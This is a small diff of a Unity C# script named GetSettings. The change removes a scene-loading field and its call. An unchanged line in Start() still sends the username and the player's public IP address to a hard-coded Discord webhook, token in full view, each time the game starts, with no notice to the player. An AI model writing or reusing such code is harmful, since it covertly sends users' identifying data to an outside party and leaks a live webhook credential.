@@ -21,7 +21,6 @@ public class GetSettings : MonoBehaviour
 
     [Space(10)]
     [SerializeField] GameObject wrongVersion;
-    [SerializeField] private SpawnScene scene;
 
     private void Start()
     {
@@ -30,7 +29,6 @@ public class GetSettings : MonoBehaviour
         SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
 
         wrongVersion.SetActive(Application.version != GetGameVersion());
-        scene.LoadScene();
 
         if (DataSetup())
         {
